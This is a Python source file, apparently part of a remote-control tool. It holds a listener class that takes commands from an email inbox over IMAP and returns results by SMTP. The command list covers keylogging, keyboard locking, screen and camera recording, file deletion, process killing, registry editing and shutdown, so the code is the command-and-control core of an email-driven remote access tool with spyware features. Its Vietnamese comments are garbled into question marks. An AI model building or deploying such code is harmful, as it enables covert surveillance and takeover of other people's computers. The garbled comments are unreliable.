import os 
import imaplib
import smtplib 
import hashlib

import email
from email import encoders
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from email import encoders

import function.directory_tree as dt
import function.app_process as ap
import function.keylogger as key
import function.screen as screen
import function.shutdown as sd
import function.camera as camera
import function.registry as reg 

def contentHTML(html): 
    part = MIMEText(html, 'html')
    return part

def contentFile(data, fileName): 
    part = MIMEBase('application', "octet-stream")
    part.set_payload(data)
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename="{fileName}"')
    return part

def contentText(text): 
    plain_text = MIMEText(text, _subtype='plain', _charset='UTF-8')
    return plain_text

def strToMD5(str):
    return hashlib.md5(str.encode()).hexdigest()

class Listener():
    def __init__(self, SMTP_HOST, IMAP_HOST, SERVER_ADDRESS, SERVER_PASSWORD, screenInfo): 
        self.smtp = smtplib.SMTP_SSL(SMTP_HOST) 
        self.imap = imaplib.IMAP4_SSL(IMAP_HOST)
        self.login(SERVER_ADDRESS, SERVER_PASSWORD)
        self.screenInfo = screenInfo

    def __del__(self): 
        # stop lisenter 
        key.flag = 4

    def login(self, ADDR, PASS): 
        try:    
            self.smtp.login(ADDR, PASS) 
            self.imap.login(ADDR, PASS)
            self.ADDR = ADDR
            return True
        except:     
            return False

    def create_ID(self, ID): 
        self.imap.select('inbox')
        status, data = self.imap.search(None, 'UNSEEN', 'FROM', f'{self.ADDR}', 'SUBJECT', f'{strToMD5(ID)}')
        mail_ids = []
        for block in data:
            mail_ids += block.split()
        if (len(mail_ids) > 0): 
            return False 
        # create ID in server mail
        msg = MIMEMultipart("alternative")
        msg["Subject"] = f'{strToMD5(ID)}'
        msg["From"] = self.ADDR
        msg["To"] = self.ADDR
        self.smtp.sendmail(self.ADDR, self.ADDR, msg.as_string())
        self.ID = ID
        return True

    def delete_ID(self, delID): 
        # delete ID in server mail 
        self.imap.select('inbox')
        status, data = self.imap.search(None, 'UNSEEN', 'FROM', f'{self.ADDR}', 'SUBJECT', f'{strToMD5(delID)}')
        mail_ids = []
        for block in data:
            mail_ids += block.split()
        for id in mail_ids:
            self.imap.fetch(id, '(RFC822)')

    def download_file(self, msg, path): 
        if (not os.path.isdir(path)): 
            return False
        for part in msg.walk(): 
            if part.get_content_maintype() == 'multipart': 
                continue 
            if (part.get('Content-Disposition') is None): 
                continue 
            fileName = part.get_filename() 

            if (bool(fileName)): 
                filepath = os.path.join(path, fileName) 
                try: 
                    with open(filepath, 'wb') as f: 
                        f.write(part.get_payload(decode=True))
                except: 
                    return False
        return True

    def get_request(self, msg): 
        for part in msg.walk():
            if (part.get_content_type() == 'text/plain'):
                return part.get_payload(decode = False)[:-1]
        return 'None'

    # DIRECTORY LIST_TREE <path>: in ra c??y th?? m???c g???c l?? th?? m???c <path> 
    # DIRECTORY LIST_DIR <path>: in ra t???t c??? th?? m???c, file n???m trong th?? m???c <path>
    # DIRECTORY LIST_DISK: in ra t???t c??? ??? ????a trong m??y t??nh 
    # DIRECTORY DELETE <path>: x??a th?? m???c ho???c file <path> 
    # DIRECTORY COPY <src> <dst>: copy th?? m???c ho???c file <src> ?????n ????ch <dst> 
    # DIRECTORY SAVE_FILE <dst>: l??u file t??? file ????nh k??m t???i email v??o th?? m???c <dst>
    # PROCESS LIST_APPS: in ra t???t c??? ???ng d???ng ??ang ch???y k??m port ID v?? thread 
    # PROCESS LIST_PROCESSES: in ra t???t c??? ti???n tr??nh ??ang ch???y k??m port ID v?? thread 
    # PROCESS KILL <PortID>: t???t ti???n tr??nh ??ang ch???y t???i port <PortID> 
    # PROCESS START <App>: m??? ???ng d???ng <App> 
    # KEYLOGGER HOOK: t???t/m??? theo d??i b??n ph??m 
    # KEYLOGGER PRINT: in ra c??c ph??m ???? b???m k??m th???i gian 
    # KEYLOGGER LOCK: kh??a b??n ph??m
    # KEYLOGGER UNLOCK: m??? kh??a b??n ph??m 
    # SCREEN TAKE: ch???p m??n h??nh 
    # SCREEN CAPTURE <n_seconds>: ghi m??n h??nh <n_seconds> gi??y 
    # SHUTDOWN: t???t m??y sau 3 gi??y
    # RESTART: kh???i ?????ng l???i m??y sau 3 gi??y
    # LOGOUT: ????ng xu???t t??i kho???n hi???n t???i tr??n m??y 
    # CAMERA <n_seconds>: quay camera <n_seconds> gi??y
    # REGISTRY GET_VALUE <path> <name_value>: l???y gi?? tr??? c???a <name_value> t???i key c?? 
    #   ???????ng d???n <path> c???a registry 
    # REGISTRY SET_VALUE <path> <name_value> <value> <type>: ?????t gi?? tr??? c???a <name_value> 
    #   t???i key c?? ???????ng d???n <path> c???a registry th??nh gi?? tr??? <value> v???i ki???u d??? li???u l?? 
    #    <value>  (<value> l?? m???t trong nh???ng gi?? tr??? ['REG_SZ', 'REG_BINARY', 'REG_DWORD', 
    #   'REG_QWORD', 'REG_MULTI_SZ', 'REG_EXPAND_SZ'])
    # REGISTRY CREATE_KEY <path>: t???o key <path> 
    # REGISTRY DELETE_KEY <path>: x??a key <path>


    def handle_msg(self, msg):  
        request = self.get_request(msg).strip().upper()
        
        #print(request)
        if (request == 'None'): 
            return 
        if ('DIRECTORY' in request):  
            dt.handle_directory(self, request, msg)
        elif ('PROCESS' in request): 
            ap.handle_app_process(self, request) 
        elif ('KEYLOGGER' in request): 
            key.handle_keylog(self, request)
        elif ('SCREEN' in request): 
            screen.handle_screen(self, request, self.screenInfo) 
        elif ('SHUTDOWN' in request): 
            sd.shutdown()
        elif ('RESTART' in request):
            sd.restart() 
        elif ('LOGOUT' in request): 
            sd.logout()
        elif ('CAMERA' in request): 
            camera.handle_camera(self, request)
        elif ('REGISTRY' in request): 
            reg.handle_registry(self, request) 
            
    def send_msg(self, subject, content): 
        msg = MIMEMultipart("alternative")
        msg["Subject"] = f'{subject} (FROM ID: {self.ID})'
        msg["From"] = self.ADDR
        msg["To"] = self.CLIENT_ADDR
        for c in content: 
            if (c[1] == 'text'): 
                msg.attach(contentText(c[0]))
            elif (c[1] == 'html'): 
                msg.attach(contentHTML(c[0]))
            else: 
                msg.attach(contentFile(c[0], c[1]))

        self.smtp.sendmail(self.ADDR, self.CLIENT_ADDR, msg.as_string())

    def recv_msg(self): 
        self.imap.select('inbox')
        status, data = self.imap.search(None, 'UNSEEN', 'SUBJECT', f'{self.ID}')
        mail_ids = []
        for block in data:
            mail_ids += block.split()

        #print('Server is listening...')
        
        if (len(mail_ids) == 0): 
            return 

        for i in mail_ids:
            status, data = self.imap.fetch(i, '(RFC822)')
            for response_part in data:
                if isinstance(response_part, tuple):
                    msg = email.message_from_bytes(response_part[1])
                    subject = msg['subject']
                    self.CLIENT_ADDR = email.utils.parseaddr(msg['From'])[1]
                    self.handle_msg(msg)
